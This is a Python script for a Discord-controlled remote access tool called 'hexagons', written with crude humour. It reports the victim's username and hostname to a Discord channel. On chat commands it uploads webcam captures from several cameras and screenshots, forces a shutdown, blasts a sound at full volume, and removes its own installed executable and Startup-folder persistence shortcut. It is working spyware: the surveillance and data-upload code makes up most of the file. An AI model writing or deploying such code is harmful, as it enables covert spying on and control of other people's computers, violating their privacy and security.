TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
import os
import discord
import pyautogui
import cv2          #use 'pip install opencv-python==4.5.3.56'
from pynput.keyboard import Key, Controller
import time
import sys
import requests
import pyttsx3
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
print("init")

def hexagons():

    client = discord.Client()
    USERNAME = os.getenv('USERNAME')
    HOSTNAME = os.getenv('COMPUTERNAME')
    @client.event
    async def on_ready():
        channel = client.get_channel(XXXXXXXXXXXXXXXXXX)
        await channel.send(f"im online <@928890207523180585> on {USERNAME}@{HOSTNAME}")
        print("logged")

    @client.event
    async def on_message(message):
        mess = str(message.content)
        if message.channel.name == 'bot-talk':
            if mess.lower() == 'ping':
                await message.channel.send("_moans_ \ndeeper~")
                return

            if mess.lower() == 'scare':
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(
                    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                volume.SetMasterVolumeLevel(-0.0, None)

                engine = pyttsx3.init()
                engine.say("oooooooooooooooooooooioooooooooooooooooooooooooooooooooeiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiimmmmmmmmmmmmmmmmmmmmmaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaeeeeeeeeeeeeeeeeeeeaeeaeaeaeaeaeooooooooooooooxxxxxxxxxxxxxxxxxxxx")
                engine.runAndWait()
                await message.channel.send("_created a spook_")
                return

            if mess.lower() == 'list':
                await message.channel.send(
                    "`ping: checks if i'm horny\npoweroff: fucks the machine\nshow: shows camera input from all the cameras\nshot: shows current screen\nstop: fucks the program\nscare: spook with speakers!\nguillotine: removes all the files from the system`")
                return

            if mess.lower() == 'poweroff':
                os.system("shutdown -s -t 5")
                await message.channel.send(message.author.mention + " `fucking off`")
                return

            if mess.lower() == 'show':
                for i in range(3):
                    cam_port = i
                    cam = cv2.VideoCapture(cam_port)
                    result, image = cam.read()
                    cv2.imwrite("py.jpg", image)
                    await message.channel.send(file=discord.File("py.jpg"))
                    os.remove("py.jpg")
                return

            if mess.lower() == 'guillotine':                                    #if installed throught ship.ps1
                os.remove(fr"C:\Users\{USERNAME}\AppData\Roaming\Addons\s.exe")
                os.remove(fr"C:\Users\{USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\NeberoLogin.lnk")
                await message.channel.send("_hexagons has been removed._")
                return

            if mess.lower() == 'shot':
                keyboard = Controller()  # this is to make sure the taskbar is captured
                keyboard.press(Key.cmd)  # as i have auto hide taskbar
                keyboard.release(Key.cmd)
                time.sleep(1)

                image = pyautogui.screenshot()  # screenshot with taskbar
                image.save("s.png")
                await message.channel.send(file=discord.File("s.png"))
                os.remove("s.png")
                return

            if mess.lower() == 'stop':
                await message.channel.send(message.author.mention + " successfully fucked")
                sys.exit()

    client.run(TOKEN)

def internet_on(sleep_time):
    url = "http://www.google.com/"
    timeout = 5
    time.sleep(sleep_time)
    try:
        time.sleep(sleep_time)
        request = requests.get(url, timeout=timeout)
        print("Connected to the Internet")
        hexagons()
    except (requests.ConnectionError, requests.Timeout) as exception:
        print("No internet connection.")

########################################################################################################################
#complex timer to prevent crash when no internet is detected
for i in range(4):
    v = 60
    while (v <= 900):
        internet_on(v)
        v = v + 60
sys.exit()
